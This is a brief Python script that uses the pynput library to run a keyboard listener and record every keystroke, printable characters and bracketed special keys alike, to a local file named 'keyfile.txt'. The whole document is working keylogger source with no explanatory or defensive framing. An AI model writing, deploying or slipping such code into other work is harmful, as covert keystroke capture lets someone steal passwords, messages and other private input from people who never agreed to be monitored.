from pynput import keyboard


def on_press(key):
    try:
        char = key.char
        with open("keyfile.txt", 'a') as logKey:
            logKey.write(char)
    except AttributeError:
        with open("keyfile.txt", 'a') as logKey:
            logKey.write(f'[{key}]')

if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()